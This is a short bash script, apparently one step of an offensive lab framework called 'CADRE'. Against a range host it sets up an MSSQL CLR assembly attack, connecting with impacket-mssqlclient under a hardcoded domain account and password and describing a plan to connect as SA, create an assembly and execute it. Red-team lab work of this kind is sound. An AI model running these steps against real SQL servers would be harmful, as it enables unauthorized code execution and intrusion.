#!/bin/bash
# CADRE — WT#042 MSSQL CLR Assembly
source ../lib/cadre-env.sh
source ../lib/common.sh
print_banner "WT#042 — MSSQL CLR Assembly"
start_attack "042" "MSSQL CLR Assembly"

require_tool impacket-mssqlclient
require_env MBR02 "MBR02"
require_env DOMAIN_EXT "DOMAIN_EXT"

step "Connect as analyst_osint on MBR02 (range.local)"
echo "WT#042: Connect as SA, then CREATE ASSEMBLY and execute"
run_cmd "impacket-mssqlclient \"$DOMAIN_EXT/analyst_osint:'0S1NT_An@lyst!'@$MBR02\" -windows-auth"

result $? "MSSQL CLR Assembly completed"
